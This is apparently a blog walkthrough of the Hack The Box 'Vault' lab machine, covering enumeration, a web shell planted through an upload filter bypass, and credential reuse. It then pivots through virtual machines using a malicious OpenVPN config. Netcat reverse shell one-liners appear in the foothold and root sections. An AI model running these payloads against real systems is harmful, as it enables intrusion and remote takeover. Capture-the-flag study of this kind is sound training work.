href=/posts/cybersecurity/hackthebox/machines/windows/querier/ title="[HTB] Machine: Querier">[HTB] Machine: Querier</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/rabbit/ title="[HTB] Machine: Rabbit">[HTB] Machine: Rabbit</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/reel/ title="[HTB] Machine: Reel">[HTB] Machine: Reel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/reel2/ title="[HTB] Machine: Reel2">[HTB] Machine: Reel2</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/remote/ title="[HTB] Machine: Remote">[HTB] Machine: Remote</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/resolute/ title="[HTB] Machine: Resolute">[HTB] Machine: Resolute</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/return/ title="[HTB] Machine: Return">[HTB] Machine: Return</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/sauna/ title="[HTB] Machine: Sauna">[HTB] Machine: Sauna</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/scrambled/ title="[HTB] Machine: Scrambled">[HTB] Machine: Scrambled</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/search/ title="[HTB] Machine: Search">[HTB] Machine: Search</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/secnotes/ title="[HTB] Machine: SecNotes">[HTB] Machine: SecNotes</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/servmon/ title="[HTB] Machine: Servmon">[HTB] Machine: Servmon</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/sharp/ title="[HTB] Machine: Sharp">[HTB] Machine: Sharp</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/silo/ title="[HTB] Machine: Silo">[HTB] Machine: Silo</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/sizzle/ title="[HTB] Machine: Sizzle">[HTB] Machine: Sizzle</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/sniper/ title="[HTB] Machine: Sniper">[HTB] Machine: Sniper</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/streamio/ title="[HTB] Machine: StreamIO">[HTB] Machine: StreamIO</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/support/ title="[HTB] Machine: Support">[HTB] Machine: Support</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/tally/ title="[HTB] Machine: Tally">[HTB] Machine: Tally</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/timelapse/ title="[HTB] Machine: Timelapse">[HTB] Machine: Timelapse</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/toolbox/ title="[HTB] Machine: Toolbox">[HTB] Machine: Toolbox</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/worker/ title="[HTB] Machine: Worker">[HTB] Machine: Worker</a></li></ul></li></ul></li><li><a href=/posts/cybersecurity/hackthebox/overview/ title="[HTB] Overview">[HTB] Overview</a></li></ul></li><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/pentesting/>Pentesting</a><ul><li><a href=/posts/cybersecurity/pentesting/active_directory/ title="[Pentesting] Active Directory">[Pentesting] Active Directory</a></li><li><a href=/posts/cybersecurity/pentesting/attacking_services/ title="[Pentesting] Attacking Services">[Pentesting] Attacking Services</a></li><li><a href=/posts/cybersecurity/pentesting/file_transfers/ title="[Pentesting] File Transfers">[Pentesting] File Transfers</a></li><li><a href=/posts/cybersecurity/pentesting/footprinting_and_enumeration/ title="[Pentesting] Footprinting and Enumeration">[Pentesting] Footprinting and Enumeration</a></li><li><a href=/posts/cybersecurity/pentesting/linux_privilege_escalation/ title="[Pentesting] Linux Privilege Escalation">[Pentesting] Linux Privilege Escalation</a></li><li><a href=/posts/cybersecurity/pentesting/mobile_pentesting/ title="[Pentesting] Mobile Pentesting">[Pentesting] Mobile Pentesting</a></li><li><a href=/posts/cybersecurity/pentesting/network_pentesting/ title="[Pentesting] Network Pentesting">[Pentesting] Network Pentesting</a></li><li><a href=/posts/cybersecurity/pentesting/osint/ title="[Pentesting] OSINT">[Pentesting] OSINT</a></li><li><a href=/posts/cybersecurity/pentesting/pivoting_tunneling_and_port_forwarding/ title="[Pentesting] Pivoting, Tunneling and Port Forwarding">[Pentesting] Pivoting, Tunneling and Port Forwarding</a></li><li><a href=/posts/cybersecurity/pentesting/shells_and_payloads/ title="[Pentesting] Shells and Payloads">[Pentesting] Shells and Payloads</a></li><li><a href=/posts/cybersecurity/pentesting/web_attacks/ title="[Pentesting] Web Attacks">[Pentesting] Web Attacks</a></li><li><a href=/posts/cybersecurity/pentesting/windows_privilege_escalation/ title="[Pentesting] Windows Privilege Escalation">[Pentesting] Windows Privilege Escalation</a></li></ul></li><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/pwn.college/>pwn.college</a><ul><li><a href=/posts/cybersecurity/pwn.college/overview/ title="[pwn.college] Overview">[pwn.college] Overview</a></li></ul></li></ul></li><li><i class="fas fa-plus-circle"></i><a href=/posts/projects/>Projects</a><ul><li><a href=/posts/projects/ums/ title="[Projects] User-mode Scheduling (UMS)">[Projects] User-mode Scheduling (UMS)</a></li></ul></li></div></ul></div></div></div></section><section class=content-section id=content-section><div class=content><div class="container p-0 read-area"><div class="hero-area col-sm-12" id=hero-area style=background-image:url(/posts/cybersecurity/hackthebox/machines/linux/vault/images/vault.png)></div><div class=page-content><div class="author-profile ml-auto align-self-lg-center"><img class=rounded-circle src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_120x120_fit_box_3.png alt="Author Image"><h5 class=author-name>Bektur Umarbaev</h5><p>Sunday, October 22, 2023</p></div><div class=title><h1>[HTB] Machine: Vault</h1></div><div class=taxonomy-terms><ul style=padding-left:0><li class=rounded><a href=/tags/htb/ class="btn, btn-sm">HTB</a></li><li class=rounded><a href=/tags/php/ class="btn, btn-sm">php</a></li><li class=rounded><a href=/tags/upload/ class="btn, btn-sm">upload</a></li><li class=rounded><a href=/tags/webshell/ class="btn, btn-sm">webshell</a></li><li class=rounded><a href=/tags/ssh/ class="btn, btn-sm">ssh</a></li><li class=rounded><a href=/tags/pivot/ class="btn, btn-sm">pivot</a></li><li class=rounded><a href=/tags/qemu/ class="btn, btn-sm">qemu</a></li><li class=rounded><a href=/tags/spice/ class="btn, btn-sm">spice</a></li><li class=rounded><a href=/tags/openvpn/ class="btn, btn-sm">openvpn</a></li><li class=rounded><a href=/tags/tunnel/ class="btn, btn-sm">tunnel</a></li><li class=rounded><a href=/tags/rbash/ class="btn, btn-sm">rbash</a></li><li class=rounded><a href=/tags/gpg/ class="btn, btn-sm">gpg</a></li><li class=rounded><a href=/tags/remmina/ class="btn, btn-sm">remmina</a></li><li class=rounded><a href=/tags/iptables/ class="btn, btn-sm">iptables</a></li><li class=rounded><a href=/tags/sudo/ class="btn, btn-sm">sudo</a></li><li class=rounded><a href=/tags/filter/ class="btn, btn-sm">filter</a></li></ul></div><div class=post-content id=post-content><h1 id=vault>Vault</h1><h2 id=enumeration>Enumeration</h2><ul><li><code>nmap</code></li></ul><pre tabindex=0><code>‚îî‚îÄ$ nmap -Pn -p- 10.10.10.109 --min-rate 5000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-23 19:19 BST
Warning: 10.10.10.109 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.109 (10.10.10.109)
Host is up (0.12s latency).
Not shown: 56547 filtered tcp ports (no-response), 8986 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 133.42 seconds
</code></pre><pre tabindex=0><code>‚îî‚îÄ$ nmap -Pn -p22,80 -sC -sV 10.10.10.109 --min-rate 5000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-23 19:21 BST
Nmap scan report for 10.10.10.109 (10.10.10.109)
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)
|   256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)
|_  256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.13 seconds
</code></pre><ul><li>Web server</li></ul><p><img src=./images/1.png alt></p><ul><li><code>gobuster</code></li></ul><pre tabindex=0><code>‚îî‚îÄ$ gobuster dir -u http://10.10.10.109 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.109
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 291]
/index.php            (Status: 200) [Size: 299]
</code></pre><ul><li>We saw an announcement about the first client: <code>sparklays</code><ul><li>Let&rsquo;s try <code>feroxbuster</code> that endpoint</li></ul></li></ul><pre tabindex=0><code>‚îî‚îÄ$ feroxbuster -u http://10.10.10.109/sparklays -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php,html --depth 3

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben &#34;epi&#34; Risher ü§ì                 ver: 2.10.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://10.10.10.109/sparklays
 üöÄ  Threads               ‚îÇ 50
 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 üëå  Status Codes          ‚îÇ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 üí•  Timeout (secs)        ‚îÇ 7
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.10.0
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 üîé  Extract Links         ‚îÇ true
 üí≤  Extensions            ‚îÇ [txt, php, html]
 üèÅ  HTTP methods          ‚îÇ [GET]
 üîÉ  Recursion Depth       ‚îÇ 3
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      316c http://10.10.10.109/sparklays =&gt; http://10.10.10.109/sparklays/
200      GET        3l        2w       16c http://10.10.10.109/sparklays/login.php
200      GET       13l       38w      615c http://10.10.10.109/sparklays/admin.php
301      GET        9l       28w      323c http://10.10.10.109/sparklays/design =&gt; http://10.10.10.109/sparklays/design/
301      GET        9l       28w      331c http://10.10.10.109/sparklays/design/uploads =&gt; http://10.10.10.109/sparklays/design/uploads/
200      GET       18l       43w      484c http://10.10.10.109/sparklays/design/changelogo.php
200      GET        3l        8w       72c http://10.10.10.109/sparklays/design/design.html
</code></pre><h2 id=foothold>Foothold</h2><ul><li>Nothing interesting on http://10.10.10.109/sparklays/login.php and http://10.10.10.109/sparklays/admin.php<ul><li>But http://10.10.10.109/sparklays/design/design.html has upload page</li></ul></li></ul><p><img src=./images/2.png alt></p><p><img src=./images/3.png alt></p><ul><li>Let&rsquo;s play around with it<ul><li>I tried uploading <code>php</code> file, looks like there&rsquo;s a file type check</li></ul></li></ul><p><img src=./images/4.png alt></p><ul><li>We could try one of the following methods to bypass the check<ul><li><a href=https://book.hacktricks.xyz/pentesting-web/file-upload#bypass-file-extensions-checks target=_blank rel=noopener>https://book.hacktricks.xyz/pentesting-web/file-upload#bypass-file-extensions-checks</a></li><li>Let&rsquo;s start with changing extensions</li><li>I will use <code>Burp Intruder</code><ul><li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst target=_blank rel=noopener>Wordlist</a></li></ul></li></ul></li></ul><p><img src=./images/5.png alt></p><ul><li>Start the attack<ul><li>We have a few hits</li></ul></li></ul><p><img src=./images/6.png alt></p><ul><li>And we have our web shell</li></ul><pre tabindex=0><code>‚îî‚îÄ$ curl -s &#39;http://10.10.10.109/sparklays/design/uploads/shell.php5&#39; -d &#39;cmd=id&#39;
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre><ul><li>Let&rsquo;s get reverse shell<ul><li><a href=https://www.revshells.com/ target=_blank rel=noopener>https://www.revshells.com/</a></li></ul></li></ul><pre tabindex=0><code>‚îî‚îÄ$ curl -s &#39;http://10.10.10.109/sparklays/design/uploads/shell.php5&#39; -d &#39;cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.16.9%206666%20%3E%2Ftmp%2Ff&#39;
</code></pre><pre tabindex=0><code>‚îî‚îÄ$ nc -vlnp 6666
listening on [any] 6666 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.10.109] 50608
bash: cannot set terminal process group (1383): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/sparklays/design/uploads$ 
</code></pre><h2 id=user>User</h2><ul><li>We have a 3 files inside <code>dave</code>&rsquo;s desktop<ul><li>One contains potential creds</li></ul></li></ul><pre tabindex=0><code>www-data@ubuntu:/$ ls -lha /home/dave/Desktop/
total 20K
drwxr-xr-x  2 dave dave 4.0K Jun  2  2021 .
drwxr-xr-x 18 dave dave 4.0K Jun  2  2021 ..
-rw-rw-r--  1 alex alex   74 Jul 17  2018 Servers
-rw-rw-r--  1 alex alex   14 Jul 17  2018 key
-rw-rw-r--  1 alex alex   20 Jul 17  2018 ssh
www-data@ubuntu:/$ ls -lha /home/dave/Desktop/ssh 
-rw-rw-r-- 1 alex alex 20 Jul 17  2018 /home/dave/Desktop/ssh
www-data@ubuntu:/$ cat /home/dave/Desktop/ssh 
dave
Dav3therav3123
www-data@ubuntu:/$ cat /home/dave/Desktop/key 
itscominghome
www-data@ubuntu:/$ cat /home/dave/Desktop/Servers 
DNS + Configurator - 192.168.122.4
Firewall - 192.168.122.5
The Vault - x
www-data@ubuntu:/$ 
</code></pre><ul><li>We can <code>su</code> as <code>dave</code><ul><li>or <code>ssh</code></li></ul></li></ul><pre tabindex=0><code>www-data@ubuntu:/$ su - dave
Password: 
dave@ubuntu:~$
</code></pre><pre tabindex=0><code>‚îî‚îÄ$ sshpass -p &#39;Dav3therav3123&#39; ssh dave@10.10.10.109 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

222 packages can be updated.
47 updates are security updates.

Last login: Sun Sep  2 07:17:32 2018 from 192.168.1.11
dave@ubuntu:~$ 
</code></pre><h2 id=root>Root</h2><ul><li>We saw a note with <code>dns</code> and <code>firewall</code> ip addresses<ul><li>Checking our network configs shows that we have additional interface within the same subnet</li></ul></li></ul><pre tabindex=0><code>dave@ubuntu:~$ ip a
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:ea:e6 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.109/24 brd 10.10.10.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:eae6/64 scope global mngtmpaddr dynamic 
       valid_lft 86399sec preferred_lft 14399sec
    inet6 fe80::250:56ff:feb9:eae6/64 scope link 
       valid_lft forever preferred_lft forever
3: virbr0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether fe:54:00:17:ab:49 brd ff:ff:ff:ff:ff:ff
    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0
       valid_lft forever preferred_lft forever
4: virbr0-nic: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc pfifo_fast state DOWN group default qlen 1000
    link/ether 52:54:00:ff:fd:68 brd ff:ff:ff:ff:ff:ff
5: vnet0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master virbr0 state UNKNOWN group default qlen 1000
    link/ether fe:54:00:17:ab:49 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::fc54:ff:fe17:ab49/64 scope link 
       valid_lft forever preferred_lft forever
6: vnet1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master virbr0 state UNKNOWN group default qlen 1000
    link/ether fe:54:00:3a:3b:d5 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::fc54:ff:fe3a:3bd5/64 scope link 
       valid_lft forever preferred_lft forever
7: vnet2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master virbr0 state UNKNOWN group default qlen 1000
    link/ether fe:54:00:e1:74:41 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::fc54:ff:fee1:7441/64 scope link 
       valid_lft forever preferred_lft forever
8: vnet3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master virbr0 state UNKNOWN group default qlen 1000
    link/ether fe:54:00:c6:70:66 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::fc54:ff:fec6:7066/64 scope link 
       valid_lft forever preferred_lft forever
</code></pre><ul><li>If we check <code>ps -aux</code>, we see <code>qemu</code><ul><li>So we have 3 vms: dns, firewall and vault</li></ul></li></ul><pre tabindex=0><code>...
libvirt+   1790  0.5 17.0 2120288 684444 ?      Sl   Oct24   6:02 qemu-system-x86_64 -enable-kvm -name DNS -S -machine pc-i440fx-xenial,accel=kvm,usb=off -cpu qemu32 -m 1024 -realtime mlock=off -smp 1,sockets=1,cores=1,threads=1 -uuid 4
root       1808  0.0  0.0      0     0 ?        S    Oct24   0:00 [kvm-pit/1790]
libvirt+   1955  0.5 15.1 2120616 607720 ?      Sl   Oct24   5:57 qemu-system-x86_64 -enable-kvm -name Firewall -S -machine pc-i440fx-xenial,accel=kvm,usb=off -cpu qemu32 -m 1024 -realtime mlock=off -smp 1,sockets=1,cores=1,threads=1 -u
root       1973  0.0  0.0      0     0 ?        S    Oct24   0:00 [kvm-pit/1955]
libvirt+   2051  0.4 14.6 2120288 589444 ?      Sl   Oct24   5:35 qemu-system-x86_64 -enable-kvm -name Vault -S -machine pc-i440fx-xenial,accel=kvm,usb=off -cpu qemu32 -m 1024 -realtime mlock=off -smp 1,sockets=1,cores=1,threads=1 -uuid
root       2068  0.0  0.0      0     0 ?        S    Oct24   0:00 [kvm-pit/2051]
...
</code></pre><ul><li>We can perform ping sweep</li></ul><pre tabindex=0><code>dave@ubuntu:~$ for i in {1..254}; do (ping -c 1 192.168.122.${i} | grep &#34;bytes from&#34; &amp;); done
64 bytes from 192.168.122.1: icmp_seq=1 ttl=64 time=0.091 ms
64 bytes from 192.168.122.4: icmp_seq=1 ttl=64 time=1.46 ms
64 bytes from 192.168.122.5: icmp_seq=1 ttl=64 time=2.15 ms
</code></pre><ul><li>Let&rsquo;s do port scan using <code>nc</code></li></ul><pre tabindex=0><code>dave@ubuntu:~$ nc -zv 192.168.122.4 1-65535 2&gt;&amp;1 | grep -v refused
Connection to 192.168.122.4 22 port [tcp/ssh] succeeded!
Connection to 192.168.122.4 80 port [tcp/http] succeeded!
</code></pre><pre tabindex=0><code>dave@ubuntu:~$ nc -zv 192.168.122.5 1-65535 2&gt;&amp;1 | grep -v refused
</code></pre><ul><li>2 port open on <code>DNS</code>, while nothing on <code>firewall</code><ul><li>I&rsquo;ll enable dynamic port forwarding</li></ul></li></ul><pre tabindex=0><code>‚îî‚îÄ$ sshpass -p &#39;Dav3therav3123&#39; ssh dave@10.10.10.109 -D 9001
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

222 packages can be updated.
47 updates are security updates.

Last login: Wed Oct 25 07:23:08 2023 from 10.10.16.9
dave@ubuntu:~$ 
</code></pre><ul><li>Let&rsquo;s open http://192.168.122.4/<ul><li>Set <code>SOCKS</code> proxy in <code>Burp</code></li></ul></li></ul><p><img src=./images/8.png alt></p><p><img src=./images/7.png alt></p><ul><li>First link http://192.168.122.4/dns-config.php doesn&rsquo;t work<ul><li>But http://192.168.122.4/vpnconfig.php works</li></ul></li></ul><p><img src=./images/9.png alt></p><ul><li>Clicking <code>Test VPN</code> results in success</li></ul><p><img src=./images/10.png alt></p><ul><li>There is a <code>RCE</code> via <code>OpenVPN</code> config<ul><li><a href=https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da target=_blank rel=noopener>https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da</a></li><li><a href=https://www.bleepingcomputer.com/news/security/downloading-3rd-party-openvpn-configs-may-be-dangerous-heres-why/ target=_blank rel=noopener>https://www.bleepingcomputer.com/news/security/downloading-3rd-party-openvpn-configs-may-be-dangerous-heres-why/</a></li><li>I&rsquo;ll launch a listener inside</li><li>The config which we will send to get a reverse shell</li></ul></li></ul><pre tabindex=0><code>remote 192.168.122.1
ifconfig 10.200.0.2 10.200.0.1
dev tun
script-security 2
up &#34;/bin/bash -c &#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.122.1 6666 &gt;/tmp/f&#39;&#34;
nobind
</code></pre><ul><li>Upload a config and hit test</li></ul><pre tabindex=0><code>dave@ubuntu:~$ nc -vlnp 6666
Listening on [0.0.0.0] (family 0, port 6666)
Connection from [192.168.122.4] port 6666 [tcp/*] accepted (family 2, sport 48906)
/bin/sh: 0: can&#39;t access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# 
</code></pre><ul><li><code>dave</code>&rsquo;s folder contains <code>ssh</code> file with creds</li></ul><pre tabindex=0><code>root@DNS:/home/dave# cat ssh
cat ssh
dave
dav3gerous567
</code></pre><ul><li>We can use creds to <code>ssh</code><ul><li>And <code>dave</code> is <code>sudo</code> user</li></ul></li></ul><pre tabindex=0><code>root@DNS:/home/dave# groups dave        
groups dave
dave : dave sudo
</code></pre><pre tabindex=0><code>dave@ubuntu:~$ ssh dave@192.168.122.4
dave@192.168.122.4&#39;s password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

98 packages can be updated.
50 updates are security updates.


Last login: Mon Sep  3 16:38:03 2018
dave@DNS:~$ sudo -l
[sudo] password for dave: 
Matching Defaults entries for dave on DNS:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dave may run the following commands on DNS:
    (ALL : ALL) ALL
dave@DNS:~$ sudo su
root@DNS:/home/dave# 
</code></pre><ul><li>I found interesting entries in <code>alex</code> bash history</li></ul><pre tabindex=0><code>root@DNS:/home/dave# cat /home/alex/.bash_history 
...
rm interfaces
sudo su
ping 192.168.5.2
su root
nc -lvp 8888
...
</code></pre><ul><li>If we check routing table, we have a route to <code>192.168.5.0/24</code></li></ul><pre tabindex=0><code>root@DNS:/home/dave# ip r
10.200.0.1 dev tun0  proto kernel  scope link  src 10.200.0.2 
192.168.5.0/24 via 192.168.122.5 dev ens3 
192.168.122.0/24 dev ens3  proto kernel  scope link  src 192.168.122.4 
</code></pre><ul><li>Let&rsquo;s check logs</li></ul><pre tabindex=0><code>root@DNS:/home/dave# grep -arn &#34;192.168.5.2&#34; /var/log
/var/log/auth.log:349:Jul 17 16:49:01 DNS sshd[1912]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
/var/log/auth.log:352:Jul 17 16:49:02 DNS sshd[1943]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
/var/log/auth.log:353:Jul 17 16:49:02 DNS sshd[1943]: Disconnected from 192.168.5.2 port 4444
/var/log/auth.log:452:Jul 17 17:21:38 DNS sshd[1560]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
/var/log/auth.log:455:Jul 17 17:21:38 DNS sshd[1590]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
/var/log/auth.log:456:Jul 17 17:21:38 DNS sshd[1590]: Disconnected from 192.168.5.2 port 4444
/var/log/auth.log:474:Jul 17 21:58:26 DNS sshd[1171]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
/var/log/auth.log:478:Jul 17 21:58:29 DNS sshd[1249]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
/var/log/auth.log:479:Jul 17 21:58:29 DNS sshd[1249]: Disconnected from 192.168.5.2 port 4444
/var/log/auth.log:533:Jul 24 15:06:10 DNS sshd[1466]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
/var/log/auth.log:536:Jul 24 15:06:10 DNS sshd[1496]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
/var/log/auth.log:537:Jul 24 15:06:10 DNS sshd[1496]: Disconnected from 192.168.5.2 port 4444
/var/log/auth.log:540:Jul 24 15:06:26 DNS sshd[1500]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.5.2  user=dave
/var/log/auth.log:541:Jul 24 15:06:28 DNS sshd[1500]: Failed password for dave from 192.168.5.2 port 4444 ssh2
/var/log/auth.log:542:Jul 24 15:06:28 DNS sshd[1500]: Connection closed by 192.168.5.2 port 4444 [preauth]
/var/log/auth.log:543:Jul 24 15:06:57 DNS sshd[1503]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
/var/log/auth.log:546:Jul 24 15:06:57 DNS sshd[1533]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
/var/log/auth.log:547:Jul 24 15:06:57 DNS sshd[1533]: Disconnected from 192.168.5.2 port 4444
/var/log/auth.log:550:Jul 24 15:07:21 DNS sshd[1536]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
/var/log/auth.log:553:Jul 24 15:07:21 DNS sshd[1566]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
/var/log/auth.log:554:Jul 24 15:07:21 DNS sshd[1566]: Disconnected from 192.168.5.2 port 4444
/var/log/auth.log:1376:Sep  2 15:07:51 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f
/var/log/auth.log:1381:Sep  2 15:10:20 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53
